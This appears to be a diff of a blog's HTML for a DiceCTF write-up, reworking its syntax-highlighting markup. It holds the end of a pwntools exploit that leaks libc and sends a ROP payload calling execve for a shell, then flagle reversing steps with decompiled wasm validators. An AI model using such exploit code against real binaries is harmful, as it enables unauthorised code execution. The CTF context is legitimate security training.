+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">base_addr</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="mh">0x00000000000765f0</span> <span class="c1"># readelf -s libc.so.6| grep &#34;puts&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Puts addr: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Base addr: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_addr</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">readrepeat</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x1a</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rsi_r15</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="n">execve</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><p class="markdown-image">
-  <img src="https://i.imgur.com/uWhMBJd.png" alt=""  />
-</p></p>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.imgur.com/uWhMBJd.png"
+        data-srcset="https://i.imgur.com/uWhMBJd.png, https://i.imgur.com/uWhMBJd.png 1.5x, https://i.imgur.com/uWhMBJd.png 2x"
+        data-sizes="auto"
+        alt="https://i.imgur.com/uWhMBJd.png"
+        title="https://i.imgur.com/uWhMBJd.png" /></p>
 <blockquote>
 <p>Flag: dice{0ur_f16h7_70_b347_p3rf3c7_blu3_5h4ll_c0n71nu3}</p>
 </blockquote>
-<h1 id="rev">Rev <a href="#rev" class="anchor">#</a></h1>
-<h2 id="flagle">flagle <a href="#flagle" class="anchor">#</a></h2>
-<p><p class="markdown-image">
-  <img src="https://i.imgur.com/JPl4t8a.png" alt=""  />
-</p>
-We were given a wasm file which is a similar app to wordle. We need to find what is the correct words (the total words are 6). We can compile the wasm file into binary, and open it with Ghidra.
+<h1 id="rev">Rev</h1>
+<h2 id="flagle">flagle</h2>
+<figure><a class="lightgallery" href="https://i.imgur.com/JPl4t8a.png" title="https://i.imgur.com/JPl4t8a.png" data-thumbnail="https://i.imgur.com/JPl4t8a.png" data-sub-html="<h2>Flagle interface</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://i.imgur.com/JPl4t8a.png"
+            data-srcset="https://i.imgur.com/JPl4t8a.png, https://i.imgur.com/JPl4t8a.png 1.5x, https://i.imgur.com/JPl4t8a.png 2x"
+            data-sizes="auto"
+            alt="https://i.imgur.com/JPl4t8a.png" />
+    </a><figcaption class="image-caption">Flagle interface</figcaption>
+    </figure>
+<p>We were given a wasm file which is a similar app to wordle. We need to find what is the correct words (the total words are 6). We can compile the wasm file into binary, and open it with Ghidra.
 After reading the decompiled, there are 5 functions on the wasm, validate_1, validate_2, validate_3, validate_5, validate_6. Each function will be used to validate each word. Below is the source code</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 export<span style="color:#555">::</span>validate_1(undefined4 param1)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  undefined4 uVar1;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#555">=</span> streq(param1,<span style="color:#f60">0x400</span>);
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> uVar1;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f60">0x400</span><span style="color:#555">:</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#99f">ram</span>:<span style="color:#f60">00000400</span> <span style="color:#f60">64</span>              <span style="color:#555">??</span>         <span style="color:#f60">64</span>h    d
-</span></span><span style="display:flex;"><span>    <span style="color:#99f">ram</span>:<span style="color:#f60">00000401</span> <span style="color:#f60">69</span>              <span style="color:#555">??</span>         <span style="color:#f60">69</span>h    i
-</span></span><span style="display:flex;"><span>    <span style="color:#99f">ram</span>:<span style="color:#f60">00000402</span> <span style="color:#f60">63</span>              <span style="color:#555">??</span>         <span style="color:#f60">63</span>h    c                                         <span style="color:#555">?</span>  <span style="color:#555">-&gt;</span>  <span style="color:#99f">ram</span>:<span style="color:#f60">007</span>b6563
-</span></span><span style="display:flex;"><span>    <span style="color:#99f">ram</span>:<span style="color:#f60">00000403</span> <span style="color:#f60">65</span>              <span style="color:#555">??</span>         <span style="color:#f60">65</span>h    e                                         <span style="color:#555">?</span>  <span style="color:#555">-&gt;</span>  <span style="color:#99f">ram</span>:<span style="color:#f60">00007</span>b65
-</span></span><span style="display:flex;"><span>    <span style="color:#99f">ram</span>:<span style="color:#f60">00000404</span> <span style="color:#f60">7</span>b              <span style="color:#555">??</span>         <span style="color:#f60">7</span>Bh    {                                         <span style="color:#555">?</span>  <span style="color:#555">-&gt;</span>  <span style="color:#99f">ram</span>:<span style="color:#f60">0000007</span>b
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined4</span> <span class="n">export</span><span class="o">::</span><span class="n">validate_1</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">param1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined4</span> <span class="n">uVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">uVar1</span> <span class="o">=</span> <span class="n">streq</span><span class="p">(</span><span class="n">param1</span><span class="p">,</span><span class="mh">0x400</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">uVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0x400</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">ram</span><span class="p">:</span><span class="mo">00000400</span> <span class="mi">64</span>              <span class="o">??</span>         <span class="mi">64</span><span class="n">h</span>    <span class="n">d</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">ram</span><span class="p">:</span><span class="mo">00000401</span> <span class="mi">69</span>              <span class="o">??</span>         <span class="mi">69</span><span class="n">h</span>    <span class="n">i</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">ram</span><span class="p">:</span><span class="mo">00000402</span> <span class="mi">63</span>              <span class="o">??</span>         <span class="mi">63</span><span class="n">h</span>    <span class="n">c</span>                                         <span class="o">?</span>  <span class="o">-&gt;</span>  <span class="nl">ram</span><span class="p">:</span><span class="mo">007</span><span class="n">b6563</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">ram</span><span class="p">:</span><span class="mo">00000403</span> <span class="mi">65</span>              <span class="o">??</span>         <span class="mi">65</span><span class="n">h</span>    <span class="n">e</span>                                         <span class="o">?</span>  <span class="o">-&gt;</span>  <span class="nl">ram</span><span class="p">:</span><span class="mo">00007</span><span class="n">b65</span>
+</span></span><span class="line"><span class="cl">    <span class="nl">ram</span><span class="p">:</span><span class="mo">00000404</span> <span class="mi">7</span><span class="n">b</span>              <span class="o">??</span>         <span class="mi">7</span><span class="n">Bh</span>    <span class="p">{</span>                                         <span class="o">?</span>  <span class="o">-&gt;</span>  <span class="nl">ram</span><span class="p">:</span><span class="mo">0000007</span><span class="n">b</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>From the above code, we know that the first word is <strong>dice{</strong></p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>uint export<span style="color:#555">::</span>validate_2(undefined4 param1,undefined4 param2,undefined4 param3,undefined4 param4,
-</span></span><span style="display:flex;"><span>                       <span style="color:#078;font-weight:bold">int</span> param5)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  uint uVar1;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> ((((<span style="color:#078;font-weight:bold">char</span>)param3 <span style="color:#555">==</span> <span style="color:#c30">&#39;3&#39;</span>) <span style="color:#555">&amp;&amp;</span> ((<span style="color:#078;font-weight:bold">char</span>)param4 <span style="color:#555">==</span> <span style="color:#c30">&#39;l&#39;</span>)) <span style="color:#555">&amp;&amp;</span> ((<span style="color:#078;font-weight:bold">char</span>)param2 <span style="color:#555">==</span> <span style="color:#c30">&#39;!&#39;</span>)) {
-</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#555">=</span> (uint)(param5 <span style="color:#555">==</span> <span style="color:#c30">L</span><span style="color:#c30">&#39;D&#39;</span> <span style="color:#555">&amp;&amp;</span> (<span style="color:#078;font-weight:bold">char</span>)param1 <span style="color:#555">==</span> <span style="color:#c30">&#39;F&#39;</span>);
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> uVar1;
-</span></span><span style="display:flex;"><span>}
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">uint</span> <span class="n">export</span><span class="o">::</span><span class="n">validate_2</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">param1</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">param2</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">param3</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">param4</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                       <span class="kt">int</span> <span class="n">param5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">uint</span> <span class="n">uVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">uVar1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((((</span><span class="kt">char</span><span class="p">)</span><span class="n">param3</span> <span class="o">==</span> <span class="sc">&#39;3&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="kt">char</span><span class="p">)</span><span class="n">param4</span> <span class="o">==</span> <span class="sc">&#39;l&#39;</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="kt">char</span><span class="p">)</span><span class="n">param2</span> <span class="o">==</span> <span class="sc">&#39;!&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">uVar1</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span><span class="p">)(</span><span class="n">param5</span> <span class="o">==</span> <span class="sa">L</span><span class="sc">&#39;D&#39;</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">param1</span> <span class="o">==</span> <span class="sc">&#39;F&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">uVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>From the above code, we know that the second word is <strong>F!3lD</strong></p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>uint export<span style="color:#555">::</span>validate_3(<span style="color:#078;font-weight:bold">int</span> param1,<span style="color:#078;font-weight:bold">int</span> param2,<span style="color:#078;font-weight:bold">int</span> param3,<span style="color:#078;font-weight:bold">int</span> param4,<span style="color:#078;font-weight:bold">int</span> param5)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  uint uVar1;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> ((((param2 <span style="color:#555">*</span> param1 <span style="color:#555">==</span> <span style="color:#f60">0x12c0</span>) <span style="color:#555">&amp;&amp;</span> (param3 <span style="color:#555">+</span> param1 <span style="color:#555">==</span> <span style="color:#f60">0xb2</span>)) <span style="color:#555">&amp;&amp;</span> (param3 <span style="color:#555">+</span> param2 <span style="color:#555">==</span> <span style="color:#f60">0x7e</span>)) <span style="color:#555">&amp;&amp;</span>
-</span></span><span style="display:flex;"><span>     ((param4 <span style="color:#555">*</span> param3 <span style="color:#555">==</span> <span style="color:#f60">0x23a6</span> <span style="color:#555">&amp;&amp;</span> (param4 <span style="color:#555">-</span> param5 <span style="color:#555">==</span> <span style="color:#f60">0x3e</span>)))) {
-</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#555">=</span> (uint)(param3 <span style="color:#555">*</span> <span style="color:#f60">0x12c0</span> <span style="color:#555">-</span> param5 <span style="color:#555">*</span> param4 <span style="color:#555">==</span> <span style="color:#f60">0x59d5d</span>);
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> uVar1;
-</span></span><span style="display:flex;"><span>}
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">uint</span> <span class="n">export</span><span class="o">::</span><span class="n">validate_3</span><span class="p">(</span><span class="kt">int</span> <span class="n">param1</span><span class="p">,</span><span class="kt">int</span> <span class="n">param2</span><span class="p">,</span><span class="kt">int</span> <span class="n">param3</span><span class="p">,</span><span class="kt">int</span> <span class="n">param4</span><span class="p">,</span><span class="kt">int</span> <span class="n">param5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">uint</span> <span class="n">uVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">uVar1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((((</span><span class="n">param2</span> <span class="o">*</span> <span class="n">param1</span> <span class="o">==</span> <span class="mh">0x12c0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">param3</span> <span class="o">+</span> <span class="n">param1</span> <span class="o">==</span> <span class="mh">0xb2</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">param3</span> <span class="o">+</span> <span class="n">param2</span> <span class="o">==</span> <span class="mh">0x7e</span><span class="p">))</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">     <span class="p">((</span><span class="n">param4</span> <span class="o">*</span> <span class="n">param3</span> <span class="o">==</span> <span class="mh">0x23a6</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">param4</span> <span class="o">-</span> <span class="n">param5</span> <span class="o">==</span> <span class="mh">0x3e</span><span class="p">))))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">uVar1</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span><span class="p">)(</span><span class="n">param3</span> <span class="o">*</span> <span class="mh">0x12c0</span> <span class="o">-</span> <span class="n">param5</span> <span class="o">*</span> <span class="n">param4</span> <span class="o">==</span> <span class="mh">0x59d5d</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">uVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>From the above code, we can easily brute-force to find the correct word. Result is <strong>d0Nu7</strong></p>
-<p><p class="markdown-image">
-  <img src="https://i.imgur.com/jTSVgPK.png" alt=""  />
-</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.imgur.com/jTSVgPK.png"
+        data-srcset="https://i.imgur.com/jTSVgPK.png, https://i.imgur.com/jTSVgPK.png 1.5x, https://i.imgur.com/jTSVgPK.png 2x"
+        data-sizes="auto"
+        alt="https://i.imgur.com/jTSVgPK.png"
+        title="https://i.imgur.com/jTSVgPK.png" />
 From the above image, we can see the implementation of validate_4. Below is the javascript method that is used to validate the fourth word.</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
